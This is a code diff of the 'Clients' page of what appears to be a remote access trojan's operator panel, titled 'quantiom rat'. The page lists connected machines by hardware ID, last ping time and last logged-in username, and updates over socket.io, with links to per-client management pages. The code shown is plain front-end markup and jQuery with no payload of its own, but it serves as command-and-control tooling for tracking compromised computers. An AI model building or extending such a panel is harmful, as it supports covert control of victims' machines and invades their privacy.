@@ -1,150 +1,141 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-
-        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-        <meta name="description" content="">
-        <meta name="author" content="">
-    
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
         <title>quantiom rat</title>
-        <link href="../../bootstrap/bootstrap.min.css" rel="stylesheet">
-        <link href="../../bootstrap/cover.css" rel="stylesheet">
-        <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css" rel="stylesheet"/>
+
+        <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/bs4/dt-1.10.21/rg-1.1.2/rr-1.2.7/sp-1.1.1/datatables.min.css" />
+        <link rel="stylesheet" href="./bootstrap/css/bootstrap-dark.css" />
+        <link rel="stylesheet" href="./css/style.css" />
+    </head>
+    <body>
+        <div class="container-fluid h-100">
+            <%- include("includes/navbar.ejs") %>
+            <div class="d-flex align-items-center justify-content-center h-100">
+                <div class="d-flex flex-column" style="width: 35%">
+                    <h1 class="text align-self-center">Clients</h1>
+                    <p class="text align-self-center" style="padding-bottom:25px;color:rgb(180, 180, 180);">View and manage clients.</p>
+                    <table id="clientTable" class="table justify-content-center align-items-center text-center" id="clientTable">
+                        <thead>
+                            <tr>
+                                <th scope="col">HWID</th>
+                                <th scope="col">Last Pinged</th>
+                                <th scope="col">Last Username</th>
+                            </tr>
+                        </thead>
+                        <tbody id="clientTableBody">
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <script
+            src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+            integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+            crossorigin="anonymous"
+        ></script>
+        <script
+            src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+            integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+            crossorigin="anonymous"
+        ></script>
+        <script
+            src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+            integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+            crossorigin="anonymous"
+        ></script>
         <script src="/socket.io/socket.io.js"></script>
-        <script src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
-        <link href="../../css/style.css" rel="stylesheet">
+        <script type="text/javascript" src="https://cdn.datatables.net/v/bs4/dt-1.10.21/rg-1.1.2/rr-1.2.7/sp-1.1.1/datatables.min.js"></script>
         <script type="text/javascript">
-            let lastPings = {};
+          let lastPings = {};
 
-            const getWhenPinged = (hwid) => {
-                return parseInt((Date.now() - lastPings[hwid]) / 1000);
-            }
+          const getWhenPinged = (hwid) => {
+              return parseInt((Date.now() - lastPings[hwid]) / 1000);
+          }
 
-            const updateTimes = () => {
-                $('#clientTableBody').children('tr').children('td').each(function(idx) {
+          const updateTimes = () => {
+              $('#clientTableBody').children('tr').children('td').each(function(idx) {
+                  if ($(this).attr('class') == 'lastPingText') {
+                      const associatedHWIDText = $(this).prev('td');
+                      const realHWID = associatedHWIDText.attr('realHWID');
+                      const secondsAgo = getWhenPinged(realHWID);
+
+                      $(this).text(secondsAgo > 60 ? '>60 seconds ago' : secondsAgo + ' seconds ago');
+                  }
+              });
+          }
+
+          const addClient = (hwid) => {
+              const row = $('<tr>');
+              const hwidElement = $('<td>').addClass('hwidText').attr('data-toggle', 'tooltip').attr('title', hwid).attr('realHWID', hwid);
+              const a = $('<a>').attr('href', `/clients/${hwid}`).text(hwid.slice(0, 20) + '...');
+              hwidElement.append(a);
+              
+              row.append(hwidElement);
+              row.append($('<td>').text(getWhenPinged(hwid) + ' seconds ago').addClass('lastPingText'));
+              
+              $('#clientTableBody').append(row);
+          }
+
+          $(document).ready(function() {
+              const socket = io();
+
+              socket.on('connect', () => {
+                  socket.emit('requestClients');
+              });
+
+              socket.on('receiveClients', (clients) => {
+                  $('#clientTableBody tr').remove(); // just incase
+
+                  Object.keys(clients).forEach(hwid => {
+                      lastPings[hwid] = clients[hwid];
+                      addClient(hwid);
+                  });
+              });
+
+              socket.on('clientPinged', hwid => {
+                  lastPings[hwid] = Date.now();
+                  updateTimes();
+              });
+
+              socket.on('clientAdded', hwid => {
+                  lastPings[hwid] = Date.now();
+                  addClient(hwid);
+                  socket.emit('getClientLastName', hwid);  
+              });
+
+              socket.on('clientRemoved', hwid => {
+                  delete lastPings[hwid];
+                  
+                  $('#clientTableBody').children('tr').children('td').each(function(idx) {
                     if ($(this).attr('class') == 'lastPingText') {
                         const associatedHWIDText = $(this).prev('td');
                         const realHWID = associatedHWIDText.attr('realHWID');
-                        const secondsAgo = getWhenPinged(realHWID);
-
-                        $(this).text(secondsAgo > 60 ? '>60 seconds ago' : secondsAgo + ' seconds ago');
+                        
+                        if (realHWID == hwid) $(this).parent('tr').remove();
                     }
-                });
-            }
+                  });
+              });
 
-            const addClient = (hwid) => {
-                const row = $('<tr>');
-                const hwidElement = $('<td>').addClass('hwidText').attr('data-toggle', 'tooltip').attr('title', hwid).attr('realHWID', hwid);
-                const a = $('<a>').attr('href', `/clients/${hwid}`).text(hwid.slice(0, 20) + '...');
-                hwidElement.append(a);
-                
-                row.append(hwidElement);
-                row.append($('<td>').text(getWhenPinged(hwid) + ' seconds ago').addClass('lastPingText'));
-                
-                $('#clientTableBody').append(row);
-            }
-
-            $(document).ready(function() {
-                const socket = io();
-
-                socket.on('connect', () => {
-                    socket.emit('requestClients');
-                });
-
-                socket.on('receiveClients', (clients) => {
-                    $('#clientTableBody tr').remove(); // just incase
-
-                    Object.keys(clients).forEach(hwid => {
-                        lastPings[hwid] = clients[hwid];
-                        addClient(hwid);
-                    });
-                });
-
-                socket.on('clientPinged', hwid => {
-                    lastPings[hwid] = Date.now();
-                    updateTimes();
-                });
-
-                socket.on('clientAdded', hwid => {
-                    lastPings[hwid] = Date.now();
-                    addClient(hwid);
-                    socket.emit('getClientLastName', hwid);  
-                });
-
-                socket.on('clientRemoved', hwid => {
-                    delete lastPings[hwid];
-                    
-                    $('#clientTableBody').children('tr').children('td').each(function(idx) {
+              socket.on('receiveClientLastName', (hwid, name) => {
+                  $('#clientTableBody').children('tr').children('td').each(function(idx) {
                       if ($(this).attr('class') == 'lastPingText') {
                           const associatedHWIDText = $(this).prev('td');
                           const realHWID = associatedHWIDText.attr('realHWID');
                           
-                          if (realHWID == hwid) $(this).parent('tr').remove();
+                          if (realHWID == hwid) {
+                              $(this).parent('tr').append($('<td>').text(name));
+                          }
                       }
-                    });
-                });
+                  });
+              });
 
-                socket.on('receiveClientLastName', (hwid, name) => {
-                    $('#clientTableBody').children('tr').children('td').each(function(idx) {
-                        if ($(this).attr('class') == 'lastPingText') {
-                            const associatedHWIDText = $(this).prev('td');
-                            const realHWID = associatedHWIDText.attr('realHWID');
-                            
-                            if (realHWID == hwid) {
-                                $(this).parent('tr').append($('<td>').text(name));
-                            }
-                        }
-                    });
-                });
+              $("body").tooltip({ selector: '[data-toggle=tooltip]' });
 
-                $("body").tooltip({ selector: '[data-toggle=tooltip]' });
-
-                setInterval(updateTimes, 1000);
-            });
-        </script>
-      <style type="text/css">
-    :root #content > #right > .dose > .dosesingle,
-    :root #content > #center > .dose > .dosesingle
-    { display: none !important; }</style></head>
-  <body>
-    <div class="site-wrapper">
-
-      <div class="site-wrapper-inner">
-
-        <div class="cover-container">
-
-          <div class="inner cover">
-            <div class="container h-100">
-                <div class="row h-85 justify-content-center align-items-center">
-              <div class="container-fluid" style="margin-top:80px">
-                <!-- Start -->
-                  <h1>Clients</h1>
-                  <p style="color:rgb(180, 180, 180);">View and manage clients.</p>
-                <!-- End of Start -->
-              </div>
-              </div>
-          </div>
-          <br/>
-          <table id="clientTable" class="table table-striped">
-          <thead>
-            <tr>
-              <th scope="col">HWID</th>
-              <th scope="col">Last Pinged</th>
-              <th scope="col">Last Username</th>
-            </tr>
-          </thead>
-          <tbody id="clientTableBody">
-          </tbody>
-        </table>
-        </div>
-
-      </div>
-    </div>
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-    <script>window.jQuery || document.write('<script src="../../../assets/js/vendor/jquery.min.js"><\/script>')</script>
-    <script src="../../bootstrap/tether.min.js.download" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
-    <script src="../../bootstrap/bootstrap.min.js.download"></script>
-    <script src="../../bootstrap/ie10-viewport-bug-workaround.js.download"></script>
-</body></html>
+              setInterval(updateTimes, 1000);
+          });
+      </script>
+    </body>
+</html>
